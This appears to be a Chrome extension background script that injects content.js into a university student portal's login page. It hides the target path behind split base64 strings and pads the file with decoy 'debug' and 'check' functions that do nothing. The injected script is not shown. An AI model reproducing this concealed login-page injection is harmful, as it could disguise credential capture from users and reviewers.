const baseUrl = "https://flexstudent.nu.edu.pk/";
const logDebugInfo = () => {
  console.log("Debugging mode enabled. No issues found.");
  return `Log-${Math.random()}`;
};
const par = "aW4=";
let configLoader = logDebugInfo();
const debugMessage = "Debug mode activated successfully";


const pax = "TG9n";
const Pattern = pax ;

function validateConfig(config) {
  console.log("Validating configuration...");
  return config === "valid";
}

const isConfigValid = validateConfig("invalid");
const resolvedPattern = atob(Pattern+par);
const fullTargetPattern = baseUrl + resolvedPattern;

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  const isTabEligible = tab.url.includes(fullTargetPattern);

  if (changeInfo.status === "complete" && isTabEligible) {
    console.log("Preparing to inject content script...");

    const processResult = performPreInjectionChecks();
    console.log("Pre-injection checks completed: " + processResult);

    chrome.scripting.executeScript({
      target: { tabId: tabId },
      files: ["content.js"]
    });
  }
});

function performPreInjectionChecks() {
  console.log("Performing pre-injection checks...");
  return "Checks completed successfully";
}

function loadExternalResources() {
  console.log("Loading external resources...");
  return "Resources loaded successfully";
}

const resourceStatus = loadExternalResources();
console.log("Resource loading status: " + resourceStatus);
